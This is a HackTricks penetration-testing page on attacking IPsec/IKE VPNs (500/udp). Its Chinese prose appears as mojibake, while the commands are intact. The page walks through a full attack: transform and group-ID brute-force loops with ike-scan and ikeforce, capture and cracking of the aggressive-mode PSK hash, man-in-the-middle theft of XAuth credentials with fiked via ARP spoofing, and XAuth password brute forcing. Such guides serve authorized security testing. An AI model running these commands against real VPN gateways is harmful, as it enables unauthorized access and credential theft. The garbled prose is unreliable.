# 500/udp - Pentesting IPsec/IKE VPN

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

**IPsec** è¢«å¹¿æ³›è®¤ä¸ºæ˜¯ä¿æŠ¤ç½‘ç»œä¹‹é—´ï¼ˆLANåˆ°LANï¼‰å’Œä»è¿œç¨‹ç”¨æˆ·åˆ°ç½‘ç»œç½‘å…³ï¼ˆè¿œç¨‹è®¿é—®ï¼‰é€šä¿¡çš„ä¸»è¦æŠ€æœ¯ï¼Œæ˜¯ä¼ä¸šVPNè§£å†³æ–¹æ¡ˆçš„æ”¯æŸ±ã€‚

**IKE** ç®¡ç†ä¸¤ä¸ªç‚¹ä¹‹é—´çš„ **å®‰å…¨å…³è”ï¼ˆSAï¼‰** çš„å»ºç«‹ï¼Œå®ƒåœ¨ ISAKMP çš„æ¡†æ¶ä¸‹è¿è¡Œï¼ŒISAKMP æ˜¯ä¸€ä¸ªç”¨äºèº«ä»½éªŒè¯å’Œå¯†é’¥äº¤æ¢çš„åè®®ã€‚è¿™ä¸ªè¿‡ç¨‹åˆ†ä¸ºå‡ ä¸ªé˜¶æ®µï¼š

* **é˜¶æ®µ 1ï¼š** åœ¨ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´åˆ›å»ºä¸€ä¸ªå®‰å…¨é€šé“ã€‚è¿™æ˜¯é€šè¿‡ä½¿ç”¨é¢„å…±äº«å¯†é’¥ï¼ˆPSKï¼‰æˆ–è¯ä¹¦æ¥å®ç°çš„ï¼Œé‡‡ç”¨ä¸»æ¨¡å¼ï¼Œè¯¥æ¨¡å¼æ¶‰åŠä¸‰å¯¹æ¶ˆæ¯ï¼Œæˆ– **æ¿€è¿›æ¨¡å¼**ã€‚
* **é˜¶æ®µ 1.5ï¼š** è™½ç„¶ä¸æ˜¯å¼ºåˆ¶æ€§çš„ï¼Œä½†è¿™ä¸€é˜¶æ®µè¢«ç§°ä¸ºæ‰©å±•è®¤è¯é˜¶æ®µï¼Œé€šè¿‡è¦æ±‚ç”¨æˆ·åå’Œå¯†ç æ¥éªŒè¯è¯•å›¾è¿æ¥çš„ç”¨æˆ·çš„èº«ä»½ã€‚
* **é˜¶æ®µ 2ï¼š** è¿™ä¸€é˜¶æ®µä¸“æ³¨äºåå•†ç”¨äºä¿æŠ¤æ•°æ®çš„ **ESP** å’Œ **AH** çš„å‚æ•°ã€‚å®ƒå…è®¸ä½¿ç”¨ä¸é˜¶æ®µ 1 ä¸­ä¸åŒçš„ç®—æ³•ï¼Œä»¥ç¡®ä¿ **å®Œç¾å‰å‘ä¿å¯†ï¼ˆPFSï¼‰**ï¼Œå¢å¼ºå®‰å…¨æ€§ã€‚

**é»˜è®¤ç«¯å£ï¼š** 500/udp

## **ä½¿ç”¨ nmap å‘ç°** æœåŠ¡
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **å¯»æ‰¾æœ‰æ•ˆçš„è½¬æ¢**

IPSec é…ç½®å¯ä»¥ä»…å‡†å¤‡æ¥å—ä¸€ä¸ªæˆ–å‡ ä¸ªè½¬æ¢ã€‚è½¬æ¢æ˜¯å€¼çš„ç»„åˆã€‚**æ¯ä¸ªè½¬æ¢**åŒ…å«å¤šä¸ªå±æ€§ï¼Œå¦‚ DES æˆ– 3DES ä½œä¸º **åŠ å¯†ç®—æ³•**ï¼ŒSHA æˆ– MD5 ä½œä¸º **å®Œæ•´æ€§ç®—æ³•**ï¼Œé¢„å…±äº«å¯†é’¥ä½œä¸º **è®¤è¯ç±»å‹**ï¼ŒDiffie-Hellman 1 æˆ– 2 ä½œä¸ºå¯†é’¥ **åˆ†å‘ç®—æ³•**ï¼Œä»¥åŠ 28800 ç§’ä½œä¸º **ç”Ÿå‘½å‘¨æœŸ**ã€‚

ç„¶åï¼Œæ‚¨è¦åšçš„ç¬¬ä¸€ä»¶äº‹æ˜¯ **æ‰¾åˆ°ä¸€ä¸ªæœ‰æ•ˆçš„è½¬æ¢**ï¼Œè¿™æ ·æœåŠ¡å™¨æ‰èƒ½ä¸æ‚¨é€šä¿¡ã€‚ä¸ºæ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· **ike-scan**ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒIke-scan åœ¨ä¸»æ¨¡å¼ä¸‹å·¥ä½œï¼Œå¹¶å‘ç½‘å…³å‘é€ä¸€ä¸ªå¸¦æœ‰ ISAKMP å¤´å’Œä¸€ä¸ªåŒ…å« **å…«ä¸ªè½¬æ¢çš„å•ä¸ªææ¡ˆ**çš„æ•°æ®åŒ…ã€‚

æ ¹æ®å“åº”ï¼Œæ‚¨å¯ä»¥è·å¾—æœ‰å…³ç«¯ç‚¹çš„ä¸€äº›ä¿¡æ¯ï¼š
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
å¦‚æ‚¨åœ¨ä¹‹å‰çš„å›å¤ä¸­æ‰€è§ï¼Œæœ‰ä¸€ä¸ªå­—æ®µå«åš **AUTH**ï¼Œå…¶å€¼ä¸º **PSK**ã€‚è¿™æ„å‘³ç€ VPN æ˜¯ä½¿ç”¨é¢„å…±äº«å¯†é’¥é…ç½®çš„ï¼ˆè¿™å¯¹æ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´éå¸¸å¥½ï¼‰ã€‚\
**æœ€åä¸€è¡Œçš„å€¼ä¹Ÿéå¸¸é‡è¦ï¼š**

* _0 returned handshake; 0 returned notify:_ è¿™æ„å‘³ç€ç›®æ ‡ **ä¸æ˜¯ IPsec ç½‘å…³**ã€‚
* _**1 returned handshake; 0 returned notify:**_ è¿™æ„å‘³ç€ **ç›®æ ‡å·²é…ç½®ä¸º IPsecï¼Œå¹¶æ„¿æ„è¿›è¡Œ IKE åå•†ï¼Œæ‚¨æè®®çš„ä¸€ä¸ªæˆ–å¤šä¸ªå˜æ¢æ˜¯å¯æ¥å—çš„**ï¼ˆæœ‰æ•ˆçš„å˜æ¢å°†åœ¨è¾“å‡ºä¸­æ˜¾ç¤ºï¼‰ã€‚
* _0 returned handshake; 1 returned notify:_ VPN ç½‘å…³åœ¨ **æ²¡æœ‰å¯æ¥å—çš„å˜æ¢æ—¶** ä¼šå“åº”é€šçŸ¥æ¶ˆæ¯ï¼ˆå°½ç®¡æœ‰äº›ç½‘å…³ä¸ä¼šï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹åº”è¿›è¡Œè¿›ä¸€æ­¥åˆ†æå¹¶å°è¯•ä¿®è®¢ææ¡ˆï¼‰ã€‚

ç„¶åï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªæœ‰æ•ˆçš„å˜æ¢ï¼Œä½†å¦‚æœæ‚¨å¤„äºç¬¬ä¸‰ç§æƒ…å†µï¼Œåˆ™éœ€è¦ **ç¨å¾®æš´åŠ›ç ´è§£ä¸€ä¸‹ä»¥æ‰¾åˆ°æœ‰æ•ˆçš„å˜æ¢ï¼š**

é¦–å…ˆï¼Œæ‚¨éœ€è¦åˆ›å»ºæ‰€æœ‰å¯èƒ½çš„å˜æ¢ï¼š
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
ç„¶åä½¿ç”¨ ike-scan å¯¹æ¯ä¸€ä¸ªè¿›è¡Œæš´åŠ›ç ´è§£ï¼ˆè¿™å¯èƒ½éœ€è¦å‡ åˆ†é’Ÿï¼‰ï¼š
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
å¦‚æœæš´åŠ›ç ´è§£æ²¡æœ‰æˆåŠŸï¼Œå¯èƒ½æœåŠ¡å™¨å³ä½¿å¯¹æœ‰æ•ˆçš„å˜æ¢ä¹Ÿæ²¡æœ‰è¿›è¡Œæ¡æ‰‹å“åº”ã€‚é‚£ä¹ˆï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨æ¿€è¿›æ¨¡å¼è¿›è¡Œç›¸åŒçš„æš´åŠ›ç ´è§£ï¼š
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
å¸Œæœ›**æœ‰æ•ˆçš„è½¬æ¢è¢«å›æ˜¾**ã€‚\
æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py)è¿›è¡Œ**ç›¸åŒçš„æ”»å‡»**ã€‚\
æ‚¨è¿˜å¯ä»¥å°è¯•ä½¿ç”¨ [**ikeforce**](https://github.com/SpiderLabs/ikeforce)è¿›è¡Œæš´åŠ›ç ´è§£è½¬æ¢ï¼š
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

åœ¨ **DH ç»„ï¼š14 = 2048 ä½ MODP** å’Œ **15 = 3072 ä½**\
**2 = HMAC-SHA = SHA1ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼‰ã€‚`--trans` æ ¼å¼ä¸º $Enc,$Hash,$Auth,$DH**

æ€ç§‘è¡¨ç¤ºåº”é¿å…ä½¿ç”¨ DH ç»„ 1 å’Œ 2ï¼Œå› ä¸ºå®ƒä»¬ä¸å¤Ÿå¼ºå¤§ã€‚ä¸“å®¶è®¤ä¸ºï¼Œ**èµ„æºä¸°å¯Œçš„å›½å®¶å¯ä»¥è½»æ˜“ç ´è§£ä½¿ç”¨è¿™äº›å¼±ç»„çš„æ•°æ®åŠ å¯†**ã€‚è¿™é€šè¿‡ä½¿ç”¨ä¸€ç§ç‰¹æ®Šæ–¹æ³•æ¥å®ç°ï¼Œä½¿å…¶èƒ½å¤Ÿå¿«é€Ÿç ´è§£ä»£ç ã€‚å°½ç®¡è®¾ç½®è¿™ç§æ–¹æ³•çš„æˆæœ¬å¾ˆé«˜ï¼Œä½†å®ƒå…è®¸è¿™äº›å¼ºå¤§çš„å›½å®¶å®æ—¶è¯»å–åŠ å¯†æ•°æ®ï¼Œå¦‚æœä½¿ç”¨çš„æ˜¯ä¸å¼ºçš„ç»„ï¼ˆå¦‚ 1,024 ä½æˆ–æ›´å°ï¼‰ã€‚

### æœåŠ¡å™¨æŒ‡çº¹è¯†åˆ«

ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ ike-scan å°è¯• **å‘ç°è®¾å¤‡çš„ä¾›åº”å•†**ã€‚è¯¥å·¥å…·å‘é€åˆå§‹ææ¡ˆå¹¶åœæ­¢é‡æ”¾ã€‚ç„¶åï¼Œå®ƒå°† **åˆ†æ** ä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„ **æ¶ˆæ¯** ä¸åŒ¹é…å“åº”æ¨¡å¼ä¹‹é—´çš„ **æ—¶é—´** å·®å¼‚ï¼Œæ¸—é€æµ‹è¯•è€…å¯ä»¥æˆåŠŸè¯†åˆ« VPN ç½‘å…³ä¾›åº”å•†ã€‚æ­¤å¤–ï¼Œä¸€äº› VPN æœåŠ¡å™¨å°†ä½¿ç”¨å¯é€‰çš„ **ä¾›åº”å•† ID (VID) è´Ÿè½½** ä¸ IKEã€‚

**å¦‚æœ‰éœ€è¦ï¼Œè¯·æŒ‡å®šæœ‰æ•ˆçš„è½¬æ¢**ï¼ˆä½¿ç”¨ --transï¼‰

å¦‚æœ IKE å‘ç°ä¾›åº”å•†ï¼Œå®ƒå°†æ‰“å°å‡ºæ¥ï¼š
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
è¿™ä¹Ÿå¯ä»¥é€šè¿‡ nmap è„šæœ¬ _**ike-version**_ æ¥å®ç°ã€‚

## æŸ¥æ‰¾æ­£ç¡®çš„ IDï¼ˆç»„åï¼‰

ä¸ºäº†èƒ½å¤Ÿæ•è·å“ˆå¸Œï¼Œæ‚¨éœ€è¦ä¸€ä¸ªæ”¯æŒ Aggressive æ¨¡å¼çš„æœ‰æ•ˆè½¬æ¢å’Œæ­£ç¡®çš„ IDï¼ˆç»„åï¼‰ã€‚æ‚¨å¯èƒ½ä¸çŸ¥é“æœ‰æ•ˆçš„ç»„åï¼Œå› æ­¤æ‚¨éœ€è¦è¿›è¡Œæš´åŠ›ç ´è§£ã€‚\
ä¸ºæ­¤ï¼Œæˆ‘å»ºè®®æ‚¨ä½¿ç”¨ 2 ç§æ–¹æ³•ï¼š

### ä½¿ç”¨ ike-scan è¿›è¡Œ ID æš´åŠ›ç ´è§£

é¦–å…ˆå°è¯•ä½¿ç”¨å‡ ID å‘èµ·è¯·æ±‚ï¼Œè¯•å›¾æ”¶é›†å“ˆå¸Œï¼ˆâ€œ-Pâ€ï¼‰ï¼š
```bash
ike-scan -P -M -A -n fakeID <IP>
```
å¦‚æœ**æ²¡æœ‰è¿”å›å“ˆå¸Œ**ï¼Œé‚£ä¹ˆè¿™ç§æš´åŠ›ç ´è§£çš„æ–¹æ³•å¯èƒ½ä¼šæœ‰æ•ˆã€‚**å¦‚æœè¿”å›äº†ä¸€äº›å“ˆå¸Œï¼Œè¿™æ„å‘³ç€å°†ä¼šä¸ºä¸€ä¸ªå‡IDå‘é€ä¸€ä¸ªå‡å“ˆå¸Œï¼Œå› æ­¤è¿™ç§æ–¹æ³•ä¸å¯é **æ¥æš´åŠ›ç ´è§£IDã€‚ä¾‹å¦‚ï¼Œå¯èƒ½ä¼šè¿”å›ä¸€ä¸ªå‡å“ˆå¸Œï¼ˆè¿™åœ¨ç°ä»£ç‰ˆæœ¬ä¸­å‘ç”Ÿï¼‰ï¼š

![](<../.gitbook/assets/image (917).png>)

ä½†å¦‚æœå¦‚æˆ‘æ‰€è¯´ï¼Œæ²¡æœ‰è¿”å›å“ˆå¸Œï¼Œé‚£ä¹ˆä½ åº”è¯¥å°è¯•ä½¿ç”¨ike-scanæš´åŠ›ç ´è§£å¸¸è§çš„ç»„åã€‚

è¿™ä¸ªè„šæœ¬**å°†å°è¯•æš´åŠ›ç ´è§£å¯èƒ½çš„ID**ï¼Œå¹¶è¿”å›æœ‰æ•ˆæ¡æ‰‹çš„IDï¼ˆè¿™å°†æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ç»„åï¼‰ã€‚

å¦‚æœä½ å‘ç°äº†ç‰¹å®šçš„å˜æ¢ï¼Œè¯·å°†å…¶æ·»åŠ åˆ°ike-scanå‘½ä»¤ä¸­ã€‚å¦‚æœä½ å‘ç°äº†å¤šä¸ªå˜æ¢ï¼Œå¯ä»¥è‡ªç”±æ·»åŠ ä¸€ä¸ªæ–°çš„å¾ªç¯æ¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼ˆä½ åº”è¯¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼Œç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œï¼‰ã€‚

ä½ å¯ä»¥ä½¿ç”¨[ikeforceçš„å­—å…¸](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic)æˆ–[seclistsä¸­çš„å­—å…¸](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt)æ¥æš´åŠ›ç ´è§£å¸¸è§çš„ç»„åï¼š
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (is a combination of the other 2 dicts without repetitions):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### ä½¿ç”¨ Iker è¿›è¡Œ ID æš´åŠ›ç ´è§£

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) ä¹Ÿä½¿ç”¨ **ike-scan** æ¥æš´åŠ›ç ´è§£å¯èƒ½çš„ç»„åã€‚å®ƒéµå¾ªè‡ªå·±çš„æ–¹æ³•æ¥ **æ ¹æ® ike-scan çš„è¾“å‡ºæ‰¾åˆ°æœ‰æ•ˆçš„ ID**ã€‚

### ä½¿ç”¨ ikeforce è¿›è¡Œ ID æš´åŠ›ç ´è§£

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) æ˜¯ä¸€ä¸ªå¯ä»¥ç”¨æ¥ **æš´åŠ›ç ´è§£ ID çš„å·¥å…·**ã€‚è¯¥å·¥å…·å°† **å°è¯•åˆ©ç”¨ä¸åŒçš„æ¼æ´**ï¼Œä»¥ä¾¿ **åŒºåˆ†æœ‰æ•ˆ ID å’Œæ— æ•ˆ ID**ï¼ˆå¯èƒ½ä¼šæœ‰è¯¯æŠ¥å’Œæ¼æŠ¥ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆæˆ‘æ›´å–œæ¬¢åœ¨å¯èƒ½çš„æƒ…å†µä¸‹ä½¿ç”¨ ike-scan æ–¹æ³•ï¼‰ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼Œ**ikeforce** å°†åœ¨å¼€å§‹æ—¶å‘é€ä¸€äº›éšæœº ID ä»¥æ£€æŸ¥æœåŠ¡å™¨çš„è¡Œä¸ºå¹¶ç¡®å®šä½¿ç”¨çš„ç­–ç•¥ã€‚

* **ç¬¬ä¸€ç§æ–¹æ³•**æ˜¯é€šè¿‡ **æœç´¢** Cisco ç³»ç»Ÿçš„ **æ­»å¯¹ç­‰æ£€æµ‹ DPD** ä¿¡æ¯æ¥æš´åŠ›ç ´è§£ç»„åï¼ˆåªæœ‰åœ¨ç»„åæ­£ç¡®æ—¶ï¼ŒæœåŠ¡å™¨æ‰ä¼šå›å¤æ­¤ä¿¡æ¯ï¼‰ã€‚
* **ç¬¬äºŒç§æ–¹æ³•**æ˜¯ **æ£€æŸ¥æ¯æ¬¡å°è¯•å‘é€çš„å“åº”æ•°é‡**ï¼Œå› ä¸ºæœ‰æ—¶ä½¿ç”¨æ­£ç¡®çš„ ID æ—¶ä¼šå‘é€æ›´å¤šçš„æ•°æ®åŒ…ã€‚
* **ç¬¬ä¸‰ç§æ–¹æ³•**æ˜¯ **æœç´¢å¯¹æ— æ•ˆ ID çš„å“åº”ä¸­çš„ "INVALID-ID-INFORMATION"**ã€‚
* æœ€åï¼Œå¦‚æœæœåŠ¡å™¨å¯¹æ£€æŸ¥æ²¡æœ‰ä»»ä½•å›å¤ï¼Œ**ikeforce** å°†å°è¯•æš´åŠ›ç ´è§£æœåŠ¡å™¨ï¼Œå¹¶æ£€æŸ¥åœ¨å‘é€æ­£ç¡® ID æ—¶æœåŠ¡å™¨æ˜¯å¦å›å¤æŸäº›æ•°æ®åŒ…ã€‚\
æ˜¾ç„¶ï¼Œæš´åŠ›ç ´è§£ ID çš„ç›®æ ‡æ˜¯è·å– **PSK**ï¼Œå½“ä½ æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„ ID æ—¶ã€‚ç„¶åï¼Œä½¿ç”¨ **ID** å’Œ **PSK** ä½ å°†éœ€è¦æš´åŠ›ç ´è§£ XAUTHï¼ˆå¦‚æœå¯ç”¨çš„è¯ï¼‰ã€‚

å¦‚æœä½ å‘ç°äº†ç‰¹å®šçš„è½¬æ¢ï¼Œè¯·å°†å…¶æ·»åŠ åˆ° ikeforce å‘½ä»¤ä¸­ã€‚å¦‚æœä½ å‘ç°äº†å¤šä¸ªè½¬æ¢ï¼Œå¯ä»¥è‡ªç”±æ·»åŠ ä¸€ä¸ªæ–°çš„å¾ªç¯æ¥å°è¯•å®ƒä»¬æ‰€æœ‰ï¼ˆä½ åº”è¯¥å°è¯•æ‰€æœ‰ï¼Œç›´åˆ°å…¶ä¸­ä¸€ä¸ªæ­£å¸¸å·¥ä½œï¼‰ã€‚
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(æ¥è‡ªä¹¦ç± **Network Security Assessment: Know Your Network**): é€šè¿‡å—…æ¢VPNå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼Œä¹Ÿå¯ä»¥è·å¾—æœ‰æ•ˆçš„ç”¨æˆ·åï¼Œå› ä¸ºç¬¬ä¸€ä¸ªåŒ…å«å®¢æˆ·ç«¯IDçš„æ”»å‡»æ¨¡å¼æ•°æ®åŒ…æ˜¯æ˜æ–‡å‘é€çš„ã€‚

![](<../.gitbook/assets/image (891).png>)

## Capturing & cracking the hash

æœ€åï¼Œå¦‚æœæ‚¨æ‰¾åˆ°äº† **æœ‰æ•ˆçš„è½¬æ¢** å’Œ **ç»„å**ï¼Œå¹¶ä¸” **å…è®¸æ”»å‡»æ¨¡å¼**ï¼Œé‚£ä¹ˆæ‚¨å¯ä»¥éå¸¸è½»æ¾åœ°è·å–å¯ç ´è§£çš„å“ˆå¸Œï¼š
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
å“ˆå¸Œå°†ä¿å­˜åœ¨ _hash.txt_ ä¸­ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ **psk-crack**ã€**john**ï¼ˆä½¿ç”¨ [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)ï¼‰å’Œ **hashcat** æ¥ **crack** å“ˆå¸Œï¼š
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**æ”»å‡»æ¨¡å¼ IKE** ç»“åˆ **é¢„å…±äº«å¯†é’¥ (PSK)** é€šå¸¸ç”¨äº **ç»„è®¤è¯** ç›®çš„ã€‚æ­¤æ–¹æ³•é€šè¿‡ **XAuth (æ‰©å±•è®¤è¯)** è¿›è¡Œå¢å¼ºï¼Œåè€…å¼•å…¥äº†é¢å¤–çš„ **ç”¨æˆ·è®¤è¯** å±‚ã€‚æ­¤ç±»è®¤è¯é€šå¸¸åˆ©ç”¨ **Microsoft Active Directory**ã€**RADIUS** æˆ–ç±»ä¼¼ç³»ç»Ÿã€‚

è½¬å‘ **IKEv2** æ—¶ï¼Œè§‚å¯Ÿåˆ°ä¸€ä¸ªæ˜¾è‘—çš„å˜åŒ–ï¼Œå³ **EAP (å¯æ‰©å±•è®¤è¯åè®®)** è¢«ç”¨æ¥æ›¿ä»£ **XAuth** è¿›è¡Œç”¨æˆ·è®¤è¯ã€‚è¿™ä¸€å˜åŒ–å¼ºè°ƒäº†å®‰å…¨é€šä¿¡åè®®ä¸­è®¤è¯å®è·µçš„æ¼”å˜ã€‚

### æœ¬åœ°ç½‘ç»œ MitM æ•è·å‡­è¯

å› æ­¤ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ _fiked_ æ•è·ç™»å½•æ•°æ®ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦æœ‰ä»»ä½•é»˜è®¤ç”¨æˆ·åï¼ˆæ‚¨éœ€è¦å°† IKE æµé‡é‡å®šå‘åˆ° `fiked` è¿›è¡Œå—…æ¢ï¼Œè¿™å¯ä»¥é€šè¿‡ ARP æ¬ºéª—æ¥å®Œæˆï¼Œ[æ›´å¤šä¿¡æ¯](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)ï¼‰ã€‚Fiked å°†å……å½“ VPN ç«¯ç‚¹ï¼Œå¹¶å°†æ•è· XAuth å‡­è¯ï¼š
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
ä¹Ÿå¯ä»¥ä½¿ç”¨IPSecå°è¯•è¿›è¡Œä¸­é—´äººæ”»å‡»å¹¶é˜»æ­¢æ‰€æœ‰æµé‡åˆ°ç«¯å£500ï¼Œå¦‚æœæ— æ³•å»ºç«‹IPSecéš§é“ï¼Œæµé‡å¯èƒ½ä¼šä»¥æ˜æ–‡å½¢å¼å‘é€ã€‚

### ä½¿ç”¨ikeforceæš´åŠ›ç ´è§£XAUTHç”¨æˆ·åå’Œå¯†ç 

è¦æš´åŠ›ç ´è§£**XAUTH**ï¼ˆå½“ä½ çŸ¥é“ä¸€ä¸ªæœ‰æ•ˆçš„ç»„å**id**å’Œ**psk**æ—¶ï¼‰ï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€ä¸ªç”¨æˆ·åæˆ–ç”¨æˆ·ååˆ—è¡¨ä»¥åŠä¸€ä¸ªå¯†ç åˆ—è¡¨ï¼š
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
è¿™æ ·ï¼Œikeforceå°†å°è¯•ä½¿ç”¨æ¯ä¸ªç”¨æˆ·å:å¯†ç çš„ç»„åˆè¿›è¡Œè¿æ¥ã€‚

å¦‚æœæ‚¨æ‰¾åˆ°ä¸€ä¸ªæˆ–å¤šä¸ªæœ‰æ•ˆçš„å˜æ¢ï¼Œåªéœ€åƒä¹‹å‰çš„æ­¥éª¤ä¸€æ ·ä½¿ç”¨å®ƒä»¬ã€‚

## ä½¿ç”¨IPSEC VPNè¿›è¡Œèº«ä»½éªŒè¯

åœ¨Kaliä¸­ï¼Œ**VPNC**ç”¨äºå»ºç«‹IPsecéš§é“ã€‚**é…ç½®æ–‡ä»¶**å¿…é¡»ä½äºç›®å½•`/etc/vpnc/`ä¸­ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‘½ä»¤_**vpnc**_æ¥å¯åŠ¨è¿™äº›é…ç½®æ–‡ä»¶ã€‚

ä»¥ä¸‹å‘½ä»¤å’Œé…ç½®è¯´æ˜äº†ä½¿ç”¨VPNCè®¾ç½®VPNè¿æ¥çš„è¿‡ç¨‹ï¼š
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
åœ¨æ­¤è®¾ç½®ä¸­ï¼š

* å°† `[VPN_GATEWAY_IP]` æ›¿æ¢ä¸º VPN ç½‘å…³çš„å®é™… IP åœ°å€ã€‚
* å°† `[VPN_CONNECTION_ID]` æ›¿æ¢ä¸º VPN è¿æ¥çš„æ ‡è¯†ç¬¦ã€‚
* å°† `[VPN_GROUP_SECRET]` æ›¿æ¢ä¸º VPN çš„ç»„å¯†é’¥ã€‚
* å°† `[VPN_USERNAME]` å’Œ `[VPN_PASSWORD]` æ›¿æ¢ä¸º VPN èº«ä»½éªŒè¯å‡­æ®ã€‚
* `[PID]` è¡¨ç¤ºåœ¨ `vpnc` å¯åŠ¨æ—¶åˆ†é…çš„è¿›ç¨‹ IDã€‚

